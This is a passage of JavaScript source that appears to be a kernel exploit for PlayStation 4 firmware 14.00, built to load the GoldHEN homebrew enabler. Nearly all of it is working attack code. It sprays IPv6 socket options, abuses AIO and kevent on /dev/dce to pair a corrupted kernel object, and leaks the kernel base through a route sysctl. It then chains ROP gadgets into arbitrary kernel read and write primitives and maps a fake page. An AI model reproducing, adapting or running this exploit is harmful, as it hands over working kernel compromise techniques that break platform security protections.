      const rv = sc(HX1400_SYSCALLS.close, fd);
      if ((rv.i32 | 0) !== 0) return false;
      if (context.releaseFd(fd) === false) return false;
      state.owned.delete(fd);
      return true;
    } catch (error) {
      note("HX-CLOSE-ERROR", `${fd}:${error && error.message ? error.message : error}`);
      return false;
    }
  };
  const ownFd = (fd) => {
    if (fd < 0) return fd;
    state.owned.add(fd);
    context.trackFd(fd);
    return fd;
  };
  const retainFd = (fd) => {
    if (!state.owned.has(fd)) return true;
    try {
      if (context.detachFd(fd) === false) return false;
      state.owned.delete(fd);
      state.retained.add(fd);
      return true;
    } catch (error) {
      note("HX-DETACH-ERROR", `${fd}:${error && error.message ? error.message : error}`);
      return false;
    }
  };
  const enterQuarantine = (reason) => {
    state.quarantine = true;
    result.quarantined = true;
    result.stageCleanupVerified = false;
    result.cleanupVerified = false;
    result.rebootRequired = true;
    for (const fd of Array.from(state.owned)) retainFd(fd);
    result.henMappingRetained =
      result.goldhenLaunchDispatched && state.henMap !== null;
    if (!state.quarantineRetained && context && typeof context.retainQuarantine === "function") {
      state.quarantineRetained = true;
      try {
        context.retainQuarantine({
          reason: String(reason),
          buffers: state.buffers.slice(),
          fakePage: state.fakePage,
          lowMapLease: state.lowMapLease,
          oracleResources: state.oracleResources.slice(),
          jitWritableMap: state.jitRwMap,
          jitExecutableMap: state.jitRxMap,
          henMap: state.henMap,
          retainedFds: Array.from(new Set([...state.retained, ...state.owned])),
        });
      } catch (error) {
        note("HX-GOLDHEN-QUARANTINE-RETAIN-ERROR", error && error.message ? error.message : error);
      }
    }
    note("HX-GOLDHEN-QUARANTINE", reason);
  };

  let stackIndex = 0;
  let gStack;
  let gCtx;
  let gMark;
  let gResult;
  const push = (value) => {
    if (stackIndex >= 112) fail("ROP_TOO_LONG", `qwords=${stackIndex}`);
    if (!gStack) fail("ROP_STACK_UNMAPPED");
    write8(add64(gStack, stackIndex * 8), value);
    stackIndex++;
  };
  const gadget = (index) => ka(HX1400_P[index]);
  const kb0 = () => {
    stackIndex = 0;
    push(gadget(23));
    push(gCtx);
    push(gadget(18));
  };
  const kb1 = () => {
    push(gadget(21)); push(HX1400_SOURCE_PINS.mark);
    push(gadget(23)); push(gMark); push(gadget(29)); push(ZERO);
    push(gadget(21)); push(add64(gCtx, 16)); push(gadget(26)); push(ZERO);
    push(gadget(22)); push({ lo: 0xffffff88, hi: 0xffffffff }); push(gadget(27)); push(ZERO);
    push(gadget(23)); push(add64(gCtx, 8)); push(gadget(29)); push(ZERO);
    push(gadget(21)); push(gadget(20));
    push(gadget(23)); push(add64(gCtx, 56)); push(gadget(29)); push(ZERO);
    push(gadget(23)); push(gCtx); push(gadget(19));
    return stackIndex;
  };
  const bridgeGo = (count) => {
    if (count > 112) return false;
    write8(gMark, ZERO);
    const event = new Uint8Array(state.eventBuffer);
    event.fill(0);
    const view = new DataView(event.buffer);
    put64(view, 0, HX1400_SOURCE_PINS.ident);
    view.setInt16(8, -23, true);
    view.setUint16(10, 1, true);
    put64(view, 32, gadget(17));
    put64(view, 40, gStack);
    sc(HX1400_SYSCALLS.kevent, state.bridgeKq, bufferAddress(state.eventBuffer), 2, 0, 0, 0);
    return same64(read8(gMark), HX1400_SOURCE_PINS.mark);
  };
  const kernelRead = (where) => {
    kb0(); push(gadget(21)); push(where); push(gadget(26)); push(ZERO);
    push(gadget(23)); push(gResult); push(gadget(29)); push(ZERO); const count = kb1();
    write8(gResult, ZERO);
    if (!bridgeGo(count)) fail("KRW_READ_BRIDGE", toHex(where));
    return read8(gResult);
  };
  const kernelWrite = (where, value) => {
    kb0(); push(gadget(21)); push(where); push(gadget(22)); push(value);
    push(gadget(28)); push(ZERO); const count = kb1();
    if (!bridgeGo(count)) fail("KRW_WRITE_BRIDGE", toHex(where));
  };
  const kernelReadBytes = (where, length) => {
    const output = new Uint8Array(length);
    let offset = 0;
    for (; offset + 8 <= length; offset += 8) {
      const value = kernelRead(add64(where, offset));
      output[offset] = value.lo & 0xff;
      output[offset + 1] = (value.lo >>> 8) & 0xff;
      output[offset + 2] = (value.lo >>> 16) & 0xff;
      output[offset + 3] = (value.lo >>> 24) & 0xff;
      output[offset + 4] = value.hi & 0xff;
      output[offset + 5] = (value.hi >>> 8) & 0xff;
      output[offset + 6] = (value.hi >>> 16) & 0xff;
      output[offset + 7] = (value.hi >>> 24) & 0xff;
    }
    if (offset < length) {
      const value = kernelRead(add64(where, offset));
      const tail = [value.lo&0xff,(value.lo>>>8)&0xff,(value.lo>>>16)&0xff,(value.lo>>>24)&0xff,value.hi&0xff,(value.hi>>>8)&0xff,(value.hi>>>16)&0xff,(value.hi>>>24)&0xff];
      for (let index = 0; offset + index < length; index += 1) output[offset + index] = tail[index];
    }
    return output;
  };
  const kernelScalar = (where, width) => {
    const value = kernelRead(where);
    if (width === 1) return value.lo & 0xff;
    if (width === 2) return value.lo & 0xffff;
    if (width === 4) return value.lo >>> 0;
    fail("GUARD_WIDTH", width);
  };
  const writeKernelDwordRop = (where, value) => {
    if (state.bridgeCallActive) fail("DWRITE_REENTRY");
    const plan = buildHx1400GoldhenDualmapDwordWritePlan(where, value);
    state.bridgeCallActive = true;
    try {
      kb0();
      push(ka(plan.popRdiRva)); push(plan.target);
      push(ka(plan.popRaxRva)); push(plan.scalar);
      push(ka(plan.writeRva)); push(plan.rbpFiller);
      if (!bridgeGo(kb1())) fail("DWRITE_BRIDGE", toHex(where));
      return 0;
    } finally {
      state.bridgeCallActive = false;
    }
  };
  const verifyBytes = (where, expected, start = 0, end = expected.length) => {
    let offset = start;
    const view = new DataView(expected.buffer, expected.byteOffset, expected.byteLength);
    for (; offset + 8 <= end; offset += 8)
      if (!same64(read8(add64(where, offset)), get64(view, offset))) return false;
    for (; offset < end; offset += 1)
      if ((p.read1(q(add64(where, offset))) & 0xff) !== expected[offset]) return false;
    return true;
  };
  const verifyZeroRange = (where, start, end) => {
    let offset = start;
    for (; offset + 8 <= end; offset += 8)
      if (!same64(read8(add64(where, offset)), ZERO)) return false;
    for (; offset < end; offset += 1)
      if ((p.read1(q(add64(where, offset))) & 0xff) !== 0) return false;
    return true;
  };
  const restoreChallenge = () => {
    if (!state.challengeMayBeDirty) return true;
    if (state.challengeAddress === null || state.challengeOriginal === null) return false;
    try {
      kernelWrite(state.challengeAddress, state.challengeOriginal);
      if (!same64(kernelRead(state.challengeAddress), state.challengeOriginal)) return false;
      state.challengeMayBeDirty = false;
      result.challengeRestored = true;
      return true;
    } catch (error) {
      note("HX-CHALLENGE-RESTORE-ERROR", error && error.message ? error.message : error);
      return false;
    }
  };

  const cleanupDescriptors = (postArm) => {
    let ok = true;
    const closeList = (fds) => { for (const fd of fds) if (fd >= 0 && !closeFd(fd)) ok = false; };
    if (postArm) closeList(state.spray);
    closeList(state.victims);
    closeList([state.anchor, state.dceFd, state.exploitKq]);
    closeList(state.plugs);
    if (!postArm) closeList(state.spray);
    closeList(Array.from(state.owned).filter((fd) => fd !== state.jitFd));
    return ok;
  };
  const restoreAffinity = () => {
    if (!state.affinitySaved || state.originalAffinity === null) return true;
    try {
      const rv = sc(HX1400_SYSCALLS.cpusetSetaffinity, 3, 1, -1, 16, bufferAddress(state.originalAffinity));
      if ((rv.i32 | 0) !== 0) return false;
      state.affinitySaved = false;
      return true;
    } catch (error) {
      note("HX-AFFINITY-RESTORE-ERROR", error && error.message ? error.message : error);
      return false;
    }
  };
  const repairTargetOption = () => {
    if (!state.pairEstablished || state.targetFd < 0 || state.sprayPacket === null || state.optRead === null || state.optLen === null) return !state.pairEstablished;
    try {
      let rv = sc(HX1400_SYSCALLS.setsockopt, state.targetFd, 41, 51, bufferAddress(state.sprayPacket), 248);
      if ((rv.i32 | 0) !== 0) return false;
      new Uint8Array(state.optRead).fill(0);
      const length = new DataView(state.optLen);
      length.setUint32(0, 248, true);
      rv = sc(HX1400_SYSCALLS.getsockopt, state.targetFd, 41, 51, bufferAddress(state.optRead), bufferAddress(state.optLen));
      const option = new DataView(state.optRead);
      const repaired = (rv.i32 | 0) === 0 && length.getUint32(0, true) === 248 &&
        option.getUint32(8, true) === 1128481603 && option.getUint32(12, true) === 1414812756;
      if (repaired) {
        state.targetFreed = false;
        state.targetRepaired = true;
      }
      return repaired;
    } catch (_) {
      return false;
    }
  };
  const releaseLowMap = () => {
    if (state.fakePage !== null) {
      try {
        const rv = sc(HX1400_SYSCALLS.munmap, q(state.fakePage), 16384);
        if ((rv.i32 | 0) !== 0) return false;
        state.fakePage = null;
        result.lowMapUnmapped = true;
      } catch (_) {
        return false;
      }
    }
    if (state.lowMapLease !== null) {
      let revoked = false;
      try {
        revoked =
          state.lowMapLease.revoke() === true &&
          state.lowMapLease.active === false;
      } catch (_) {
        revoked = false;
      }
      if (!revoked) return false;
      result.lowMapLeaseRevoked = true;
      state.lowMapLease = null;
    }
    return true;
  };
  const safeDown = () => {
    if (!state.armed) {
      return {
        slot: !state.slotMutationAttempted || state.slotRestored,
        bridge: state.bridgeKq < 0 || state.bridgeDeleted,
      };
    }
    state.armed = false;
    let slot = false;
    let bridge = state.bridgeKq < 0;
    try {
      write4(add64(state.fake, 56), 0x40000000);
      write8(add64(state.fake, 80), ZERO);
      write8(add64(state.fake, 88), ZERO);
      zeroMemory(add64(state.fake, 2304), 96);
      zeroMemory(add64(state.fake, 2560), 96);
      const opsIntact =
        state.fakeOps !== null &&
        same64(read8(add64(state.fakeOps, 8)), gadget(15));
      if (!state.slotMutationAttempted) {
        slot = true;
      } else if (
        state.slotOriginalVerified &&
        state.slotAddress !== null &&
        state.slotOriginal !== null &&
        opsIntact &&
        state.bridgeKq >= 0
      ) {
        write8(add64(state.fakeOps, 32), gadget(16));
        write8(gResult, ZERO);
        kb0();
        push(gadget(21)); push(state.slotAddress); push(gadget(22)); push(state.slotOriginal);
        push(gadget(28)); push(ZERO);
        push(gadget(21)); push(state.slotAddress); push(gadget(26)); push(ZERO);
        push(gadget(23)); push(gResult); push(gadget(29)); push(ZERO);
        const restored = bridgeGo(kb1());
        slot = restored && same64(read8(gResult), state.slotOriginal);
        if (slot) state.slotRestored = true;
      }
      if (state.bridgeKq >= 0 && slot) {
        copyBuffer(state.eventBuffer, buildKevent(HX1400_SOURCE_PINS.ident, -23, 2));
        const deleted = sc(HX1400_SYSCALLS.kevent, state.bridgeKq, bufferAddress(state.eventBuffer), 1, 0, 0, 0);
        bridge = (deleted.i32 | 0) === 0 && closeFd(state.bridgeKq);
        if (bridge) state.bridgeDeleted = true;
      }
    } catch (error) {
      note("HX-SAFEDOWN-ERROR", error && error.message ? error.message : error);
    }
    if (!slot || !bridge) enterQuarantine(`safe-down slot=${slot} bridge=${bridge}`);
    return { slot, bridge };
  };

  try {
    if (
      context === null ||
      typeof context !== "object" ||
      context.firmware !== "14.00"
    ) fail("BAD_CONTEXT", "firmware");
    validateClaim(context);
    p = context.p;
    int64 = context.int64;
    syscall = context.syscall;
    emit = context.emit;
    check = context.check;
    if (
      !p ||
      typeof p.read1 !== "function" ||
      typeof p.leaseMappedLowRange !== "function" ||
      typeof int64 !== "function" ||
      typeof syscall !== "function" ||
      typeof context.bufAddr !== "function" ||
      typeof context.resolveSyscallStub !== "function" ||
      typeof context.trackFd !== "function" ||
      typeof context.releaseFd !== "function" ||
      typeof context.detachFd !== "function" ||
      typeof context.retainQuarantine !== "function" ||
      typeof context.fetchHen !== "function" ||
      typeof context.sha256 !== "function" ||
      typeof context.callAddr !== "function" ||
      !context.libkernelBase ||
      !context.off ||
      !Number.isInteger(context.off.k_pthread_create)
    ) fail("BAD_CONTEXT", "GoldHEN bridge");
    const constants = validateHx1400GoldhenDualmapConstants();
    asserted("HX_GOLDHEN_CONSTANTS", constants.ok, constants.faults.join(","));
    for (const number of REQUIRED_SYSCALLS)
      if (context.resolveSyscallStub(number) === null)
        fail("MISSING_SYSCALL", number);
    patchBytes = bytesFromHex(HX1400_PATCH_HEX);
    const patchDigest = digestHex(await context.sha256(patchBytes));
    if (patchDigest !== HX1400_SOURCE_PINS.patchSha256) fail("PATCH_SHA256", patchDigest);
    note("HX-GOLDHEN-START", `run=${context.claim.run_id} max_arms=${context.claim.max_arms}`);


    const mib = buildRouteMib().buffer;
    const route = new ArrayBuffer(32768);
    const routeLength = new ArrayBuffer(8);
    const requests = buildAioRequests().buffer;
    const ids = new ArrayBuffer(20);
    const poll = new ArrayBuffer(20);
    const cancel = new ArrayBuffer(20);
    const deleted = new ArrayBuffer(20);
    const affinitySaved = new ArrayBuffer(16);
    const affinityOne = new ArrayBuffer(16);
    const affinityRead = new ArrayBuffer(16);
    const sprayPacket = buildSprayPacket().buffer;
    const optionSource = buildMembershipOption("source").buffer;
    const optionGroup = buildMembershipOption("group").buffer;
    const optionBlock = buildMembershipOption("block").buffer;
    const optRead = new ArrayBuffer(512);
    const optLen = new ArrayBuffer(8);
    const eventBuffer = new ArrayBuffer(64);
    const stat = new ArrayBuffer(256);
    state.buffers = [
      mib, route, routeLength, requests, ids, poll, cancel, deleted,
      affinitySaved, affinityOne, affinityRead, sprayPacket, optionSource,
      optionGroup, optionBlock, optRead, optLen, eventBuffer, stat,
    ];
    state.eventBuffer = eventBuffer;
    state.originalAffinity = affinitySaved;
    state.sprayPacket = sprayPacket;
    state.optRead = optRead;
    state.optLen = optLen;

    const routeLenView = new DataView(routeLength);
    routeLenView.setUint32(0, 0, true);
    let rv = sc(HX1400_SYSCALLS.sysctl, bufferAddress(mib), 6, 0, bufferAddress(routeLength), 0, 0);
    if ((rv.i32 | 0) !== 0) fail("ROUTE_CLOSED", rv.i32);
    rv = sc(HX1400_SYSCALLS.cpusetGetaffinity, 3, 1, -1, 16, bufferAddress(affinitySaved));
    if ((rv.i32 | 0) !== 0) fail("AFFINITY_GET", rv.i32);
    const savedBytes = new Uint8Array(affinitySaved);
    const core = savedBytes.findIndex((value) => value !== 0);
    if (core < 0) fail("AFFINITY_EMPTY");
    const coreIndex = core * 8 + (Math.clz32((savedBytes[core] & -savedBytes[core]) >>> 0) ^ 31);
    new Uint8Array(affinityOne)[coreIndex >>> 3] = 1 << (coreIndex & 7);
    rv = sc(HX1400_SYSCALLS.cpusetSetaffinity, 3, 1, -1, 16, bufferAddress(affinityOne));
    if ((rv.i32 | 0) !== 0) fail("AFFINITY_SET", rv.i32);
    state.affinitySaved = true;
    rv = sc(HX1400_SYSCALLS.cpusetGetaffinity, 3, 1, -1, 16, bufferAddress(affinityRead));
    if ((rv.i32 | 0) !== 0 || !new Uint8Array(affinityRead).every((value, index) => value === new Uint8Array(affinityOne)[index])) fail("AFFINITY_READBACK");

    let kbase = null;
    for (let segment = 0; segment < 12 && kbase === null; segment++) {
      for (let cycle = 0; cycle < 32; cycle++) {
        new Uint8Array(ids).fill(0);
        result.aioCleanupVerified = false;
        rv = sc(HX1400_SYSCALLS.aioSubmitCmd, 4097, bufferAddress(requests), 5, 3, bufferAddress(ids));
        if ((rv.i32 | 0) !== 0) fail("AIO_SUBMIT", `segment=${segment} cycle=${cycle} rc=${rv.i32}`);
        const idView = new Int32Array(ids);
        if (Array.from(idView).some((value) => value === 0)) fail("AIO_ZERO_ID", cycle);
        new Uint8Array(cancel).fill(0);
        sc(HX1400_SYSCALLS.aioMultiCancel, bufferAddress(ids), 5, bufferAddress(cancel));
        let stuck = true;
        for (let spin = 0; spin < 4 && stuck; spin++) {
          new Uint8Array(poll).fill(0);
          sc(HX1400_SYSCALLS.aioMultiPoll, bufferAddress(ids), 5, bufferAddress(poll));
          new Uint8Array(deleted).fill(0);
          rv = sc(HX1400_SYSCALLS.aioMultiDelete, bufferAddress(ids), 5, bufferAddress(deleted));
          stuck = (rv.i32 | 0) !== 0 || Array.from(new Int32Array(deleted)).some((value) => value !== 0);
        }
        if (stuck) {
          enterQuarantine(`aio ids segment=${segment} cycle=${cycle}`);
          fail("AIO_CLEANUP_STUCK", `segment=${segment} cycle=${cycle}`);
        }
        result.aioCleanupVerified = true;
      }
      routeLenView.setUint32(0, 32768, true);
      rv = sc(HX1400_SYSCALLS.sysctl, bufferAddress(mib), 6, bufferAddress(route), bufferAddress(routeLength), 0, 0);
      if ((rv.i32 | 0) === 0) {
        const parsed = parseRouteDump(new Uint8Array(route, 0, Math.min(routeLenView.getUint32(0, true), 32768)));
        kbase = parsed.base;
      }
    }
    if (kbase === null) fail("NO_KBASE");
    state.kbase = kbase;
    asserted("HX_KBASE", strictRouteKernelPointer(kbase), "validated");
    result.kbaseValidated = true;
    if (!restoreAffinity()) fail("AFFINITY_RESTORE_AFTER_LEAK");
    rv = sc(HX1400_SYSCALLS.cpusetSetaffinity, 3, 1, -1, 16, bufferAddress(affinityOne));
    if ((rv.i32 | 0) !== 0) fail("AFFINITY_REPIN", rv.i32);
    state.affinitySaved = true;
    new Uint8Array(affinityRead).fill(0);
    rv = sc(HX1400_SYSCALLS.cpusetGetaffinity, 3, 1, -1, 16, bufferAddress(affinityRead));
    if ((rv.i32 | 0) !== 0 || !new Uint8Array(affinityRead).every((value, index) => value === new Uint8Array(affinityOne)[index])) fail("AFFINITY_REPIN_READBACK");

    state.anchor = ownFd(sc(HX1400_SYSCALLS.socket, 2, 2, 0).i32 | 0);
    if (state.anchor < 0) fail("ANCHOR_SOCKET", state.anchor);
    let previous = state.anchor;
    for (let i = 0; i < HX1400_GOLDHEN_DUALMAP_PRIMARY_VICTIMS; i++) {
      const fd = ownFd(sc(HX1400_SYSCALLS.socket, 2, 2, 0).i32 | 0);
      if (fd <= previous) break;
      previous = fd;
      state.victims.push(fd);
    }
    if (state.victims.length !== HX1400_GOLDHEN_DUALMAP_PRIMARY_VICTIMS)
      fail("VICTIM_COUNT", state.victims.length);

    const dcePath = new TextEncoder().encode("/dev/dce\0");
    const dcePathBuffer = dcePath.buffer;
    state.buffers.push(dcePathBuffer);
    const ourDce = ownFd(sc(HX1400_SYSCALLS.open, bufferAddress(dcePathBuffer), 2, 0).i32 | 0);
    if (ourDce < 0) fail("DCE_OPEN", ourDce);
    const statBytes = new Uint8Array(stat);
    const statView = new DataView(stat);
    statBytes.fill(0);
    rv = sc(HX1400_SYSCALLS.fstat, ourDce, bufferAddress(stat));
    if ((rv.i32 | 0) !== 0) fail("DCE_FSTAT", rv.i32);
    const ownInode = statView.getUint32(4, true);
    if (ownInode === 0) fail("DCE_INODE");

    const dceMatches = [];
    for (let fd = 3; fd <= 37; fd++) {
      statBytes.fill(0);
      rv = sc(HX1400_SYSCALLS.fstat, fd, bufferAddress(stat));
      if ((rv.i32 | 0) !== 0) continue;
      const mode = statView.getUint16(8, true);
      const inode = statView.getUint32(4, true);
      if ((mode & 0xf000) === 0x2000 && inode === ownInode) dceMatches.push(fd);
    }
    note("HX-DCE-CENSUS", `inode=0x${ownInode.toString(16)} matches=${dceMatches.length ? dceMatches.join(",") : "none"}`);
    if (!closeFd(ourDce)) fail("DCE_CLOSE");

    for (const fd of dceMatches) {
      if (fd === ourDce) continue;
      if (state.owned.has(fd)) fail("DCE_CENSUS_OWNERSHIP", fd);
      statBytes.fill(0);
      rv = sc(HX1400_SYSCALLS.fstat, fd, bufferAddress(stat));
      const unchanged = (rv.i32 | 0) === 0 &&
        (statView.getUint16(8, true) & 0xf000) === 0x2000 &&
        statView.getUint32(4, true) === ownInode;
      if (!unchanged) fail("DCE_CENSUS_CHANGED", fd);
      state.dceHostCloseAttempted = true;
      rv = sc(HX1400_SYSCALLS.close, fd);
      if ((rv.i32 | 0) !== 0) fail("DCE_CENSUS_CLOSE", fd);
    }

    const plugPaths = ["/dev/null", "/dev/zero", "/dev/urandom", "/dev/random"];
    let plugPath = null;
    let plugPathBuffer = null;
    for (const candidate of plugPaths) {
      const bytes = new TextEncoder().encode(`${candidate}\0`);
      state.buffers.push(bytes.buffer);
      const probe = ownFd(sc(HX1400_SYSCALLS.open, bufferAddress(bytes.buffer), 2, 0).i32 | 0);
      if (probe < 0) continue;
      if (!closeFd(probe)) fail("DCE_PLUG_PROBE_CLOSE", candidate);
      plugPath = candidate;
      plugPathBuffer = bytes.buffer;
      break;
    }
    if (dceMatches.length !== 0 && plugPathBuffer === null) fail("DCE_PLUG_DEVICE");
    for (let index = 0; index < dceMatches.length; index++) {
      const plug = ownFd(sc(HX1400_SYSCALLS.open, bufferAddress(plugPathBuffer), 2, 0).i32 | 0);
      if (plug < 0) fail("DCE_PLUG_OPEN", index);
      state.plugs.push(plug);
      if (plug !== dceMatches[index]) fail("DCE_PLUG_FD", `index=${index} expected=${dceMatches[index]} actual=${plug}`);
    }
    note("HX-DCE-PLUGS", `device=${plugPath || "none"} exact=${state.plugs.length}/${dceMatches.length}`);

    const warmDce = ownFd(sc(HX1400_SYSCALLS.open, bufferAddress(dcePathBuffer), 2, 0).i32 | 0);
    if (warmDce >= 0 && !closeFd(warmDce)) fail("DCE_WARM_CLOSE");

    for (let i = 0; i < 144; i++) {
      const fd = ownFd(sc(HX1400_SYSCALLS.socket, 28, 2, 0).i32 | 0);
      if (fd < 0 || (state.spray.length && fd <= state.spray[state.spray.length - 1])) break;
      state.spray.push(fd);
    }
    for (const fd of state.spray) sc(HX1400_SYSCALLS.setsockopt, fd, 41, 51, bufferAddress(sprayPacket), 248);
    if (state.spray.length < 128) fail("SPRAY_COUNT", state.spray.length);
    state.exploitKq = ownFd(sc(HX1400_SYSCALLS.kqueue).i32 | 0);
    if (state.exploitKq < 0) fail("EXPLOIT_KQUEUE", state.exploitKq);

    let targetIndex = -1;
    let heldFd = -1;
    const optionView = new DataView(optRead);
    const optLenView = new DataView(optLen);
    const emitArm = (record) => {
      note("HX-GOLDHEN-ARM", JSON.stringify(record));
    };
    let packedRound = 0;
    armSearch:
    for (const { round, candidateIndex } of buildHx1400CandidateSchedule(state.spray.length)) {
      if (result.armsAttempted >= context.claim.max_arms) break;
      if (round !== packedRound) {
        for (const fd of state.spray) {
          rv = sc(HX1400_SYSCALLS.setsockopt, fd, 41, 51, 0, 0);
          if ((rv.i32 | 0) !== 0)
            fail("ROUND_CLEAR_FAILED", `round=${round} fd=${fd} rc=${rv.i32 | 0}`);
        }
        for (const fd of state.spray) {
          rv = sc(HX1400_SYSCALLS.setsockopt, fd, 41, 51, bufferAddress(sprayPacket), 248);
          if ((rv.i32 | 0) !== 0)
            fail("ROUND_REPACK_FAILED", `round=${round} fd=${fd} rc=${rv.i32 | 0}`);
        }
        packedRound = round;
        note("HX-GOLDHEN-ROUND", `round=${round}/${HX1400_GOLDHEN_DUALMAP_ROUNDS} arms=${result.armsAttempted}/${context.claim.max_arms}`);
      }

        new Uint8Array(optRead).fill(0);
        optLenView.setUint32(0, 248, true);
        rv = sc(
          HX1400_SYSCALLS.getsockopt,
          state.spray[candidateIndex],
          41,
          51,
          bufferAddress(optRead),
          bufferAddress(optLen),
        );
        if (
          (rv.i32 | 0) !== 0 ||
          optLenView.getUint32(0, true) !== 248 ||
          optionView.getUint32(8, true) !== 1128481603 ||
          optionView.getUint32(12, true) !== 1414812756
        ) continue;
        rv = sc(HX1400_SYSCALLS.setsockopt, state.spray[candidateIndex], 41, 51, 0, 0);
        if ((rv.i32 | 0) !== 0) continue;

        const dce = ownFd(sc(HX1400_SYSCALLS.open, bufferAddress(dcePathBuffer), 2, 0).i32 | 0);
        if (dce < 0) {
          rv = sc(
            HX1400_SYSCALLS.setsockopt,
            state.spray[candidateIndex],
            41,
            51,
            bufferAddress(sprayPacket),
            248,
          );
          if ((rv.i32 | 0) !== 0)
            fail("DCE_OPEN_RESTORE_FAILED", `round=${round} candidate=${candidateIndex}`);
          continue;
        }

        const record = {
          sequence: result.armsAttempted + 1,
          sprayCount: state.spray.length,
          round,
          candidateIndex,
          candidateFd: state.spray[candidateIndex],
          dceFd: dce,
          evAddRc: null,
          scanOk: 0,
          scanErrors: 0,
          nonStockOptions: 0,
          matches: 0,
          targetIndex: null,
          targetFd: null,
          evDeleteRc: null,
          candidateRestoreRc: null,
          repairFailures: 0,
          dceCloseOk: null,
          outcome: "interrupted",
        };
        result.armsAttempted++;
        result.possibleBlindWrites++;
        result.rebootRequired = true;
        result.armRecords.push(record);

        copyBuffer(eventBuffer, buildKevent(dce, -18, 1, 90));
        rv = sc(
          HX1400_SYSCALLS.kevent,
          state.exploitKq,
          bufferAddress(eventBuffer),
          1,
          0,
          0,
          0,
        );
        record.evAddRc = rv.i32 | 0;

        let localTarget = -1;
        if (record.evAddRc === 0) {
          const marker = (((dce & 0xffff) << 16) | 0x985a) >>> 0;
          for (let victim = 0; victim < state.spray.length; victim++) {
            if (victim === candidateIndex) continue;
            new Uint8Array(optRead).fill(0);
            optLenView.setUint32(0, 248, true);
            rv = sc(
              HX1400_SYSCALLS.getsockopt,
              state.spray[victim],
              41,
              51,
              bufferAddress(optRead),
              bufferAddress(optLen),
            );
            if ((rv.i32 | 0) !== 0) {
              record.scanErrors++;
              continue;
            }
            record.scanOk++;
            const length = optLenView.getUint32(0, true);
            const word0 = optionView.getUint32(8, true);
            const word1 = optionView.getUint32(12, true);
            if (length === 248 && word0 === marker && word1 === 0) {
              record.matches++;
              localTarget = victim;
            } else if (length !== 248 || word0 !== 1128481603 || word1 !== 1414812756) {
              record.nonStockOptions++;
            }
          }

          if (record.matches === 1 && localTarget >= 0) {
            record.targetIndex = localTarget;
            record.targetFd = state.spray[localTarget];
          }
          if (record.matches === 1 && localTarget >= 0 && record.scanErrors === 0) {
            copyBuffer(eventBuffer, buildKevent(dce, -18, 2));
            rv = sc(
              HX1400_SYSCALLS.kevent,
              state.exploitKq,
              bufferAddress(eventBuffer),
              1,
              0,
              0,
              0,
            );
            record.evDeleteRc = rv.i32 | 0;
            if (record.evDeleteRc !== 0) state.eventDeleteHazard = true;
            rv = sc(
              HX1400_SYSCALLS.setsockopt,
              state.spray[candidateIndex],
              41,
              51,
              bufferAddress(sprayPacket),
              248,
            );
            record.candidateRestoreRc = rv.i32 | 0;
            if (record.evDeleteRc === 0 && record.candidateRestoreRc === 0) {
              targetIndex = localTarget;
              heldFd = dce;
              state.dceFd = dce;
              state.targetFd = state.spray[localTarget];
              state.pairEstablished = true;
              result.pairEstablished = true;
              result.pairRound = round;
              result.pairCandidateIndex = candidateIndex;
              result.pairCandidateFd = state.spray[candidateIndex];
              result.pairTargetIndex = localTarget;
              result.pairTargetFd = state.spray[localTarget];
              result.possibleBlindWrites--;
              record.outcome = "paired";
              emitArm(record);
              break armSearch;
            }
            record.outcome =
              record.evDeleteRc !== 0
                ? "pair-delete-failed"
                : "candidate-restore-failed";
          } else {
            copyBuffer(eventBuffer, buildKevent(dce, -18, 2));
            rv = sc(
              HX1400_SYSCALLS.kevent,
              state.exploitKq,
              bufferAddress(eventBuffer),
              1,
              0,
              0,
              0,
            );
            record.evDeleteRc = rv.i32 | 0;
            if (record.evDeleteRc !== 0) state.eventDeleteHazard = true;
            record.outcome =
              record.evDeleteRc !== 0
                ? "event-delete-failed"
                : record.scanErrors !== 0
                  ? "scan-incomplete"
                  : record.matches > 1
                    ? "ambiguous"
                    : "no-match";
          }
        } else {
          record.outcome = "evadd-failed";
        }

        for (const fd of state.spray) {
          rv = sc(
            HX1400_SYSCALLS.setsockopt,
            fd,
            41,
            51,
            bufferAddress(sprayPacket),
            248,
          );
          if ((rv.i32 | 0) !== 0) record.repairFailures++;
        }
        record.dceCloseOk = closeFd(dce);
        if (record.repairFailures !== 0 || !record.dceCloseOk) {
          record.outcome = "cleanup-failed";
          emitArm(record);
          enterQuarantine(
            `arm cleanup sequence=${record.sequence} repairs=${record.repairFailures} dce_close=${record.dceCloseOk}`,
          );
          fail("ARM_CLEANUP_FAILED", `sequence=${record.sequence}`);
        }
        emitArm(record);
        if (
          record.evDeleteRc !== null &&
          record.evDeleteRc !== 0
        ) {
          enterQuarantine(`event delete failed sequence=${record.sequence}`);
          fail("ARM_DELETE_FAILED", `sequence=${record.sequence} rc=${record.evDeleteRc}`);
        }
        if (record.scanErrors !== 0)
          fail("SCAN_INCOMPLETE", `sequence=${record.sequence} errors=${record.scanErrors}`);
        if (record.matches > 1)
          fail("AMBIGUOUS_PAIR", `sequence=${record.sequence} matches=${record.matches}`);
        if (record.outcome === "candidate-restore-failed")
          fail("CANDIDATE_RESTORE_FAILED", `sequence=${record.sequence}`);
    }
    if (targetIndex < 0)
      fail(
        "NO_PAIR",
        `arms=${result.armsAttempted}/${context.claim.max_arms} possible_blind=${result.possibleBlindWrites}`,
      );

    let previousVictimFd = state.victims[state.victims.length - 1];
    for (let i = 0; i < HX1400_GOLDHEN_DUALMAP_RESERVE_VICTIMS; i++) {
      const fd = ownFd(sc(HX1400_SYSCALLS.socket, 2, 2, 0).i32 | 0);
      if (fd <= previousVictimFd) break;
      previousVictimFd = fd;
      state.victims.push(fd);
    }
    if (state.victims.length !== HX1400_GOLDHEN_DUALMAP_KVA_SEARCH_LIMIT)
      fail(
        "VICTIM_RESERVE_COUNT",
        `${state.victims.length}/${HX1400_GOLDHEN_DUALMAP_KVA_SEARCH_LIMIT}`,
      );
    note(
      "HX-KVA-VICTIMS",
      `primary=${HX1400_GOLDHEN_DUALMAP_PRIMARY_VICTIMS} reserve=${HX1400_GOLDHEN_DUALMAP_RESERVE_VICTIMS} total=${state.victims.length}`,
    );

    const fake = { lo: ((((heldFd & 0xffff) << 16) | 0x9800) >>> 0), hi: 0 };
    const page = { lo: (fake.lo & 0xffffc000) >>> 0, hi: 0 };
    if (!validHx1400GoldhenDualmapPage(page))
      fail("LOWMAP_RANGE", "policy");
    result.lowMapPolicyValidated = true;
    const mapped = pointerResult(
      sc(
        HX1400_SYSCALLS.mmap,
        q(page),
        HX1400_GOLDHEN_DUALMAP_PAGE_BYTES,
        3,
        4114,
        -1,
        0,
      ),
    );
    if (!same64(mapped, page)) fail("FAKE_MMAP", toHex(mapped));
